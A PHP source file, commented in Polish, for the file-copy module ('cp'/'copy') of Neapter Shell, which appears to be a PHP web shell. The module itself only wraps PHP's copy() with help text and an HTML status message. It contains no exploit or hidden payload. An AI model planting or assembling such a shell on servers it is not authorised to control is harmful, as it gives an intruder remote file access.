<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Kopiowanie pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleCp extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'cp',
			'copy'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.01 2011-06-21 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Kopiowanie pliku

	Użycie:
		cp plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> getArgs() -> getNumberOfParams() !== 2 )
		{
			return $this -> getHelp();
		}

		$sSource = $this -> oShell -> getArgs() -> getParam( 0 );
		$sDestination = $this -> oShell -> getArgs() -> getParam( 1 );

		if( ! @ copy( $sSource, $sDestination ) )
		{
			$sMsg = 'Plik "%s" <span class="red">nie został skopiowany</span> do "%s"';
		}
		else
		{
			$sMsg = 'Plik "%s" <span class="green">został skopiowany</span> do "%s"';
		}

		return sprintf( $sMsg, $sSource, $sDestination );
	}

}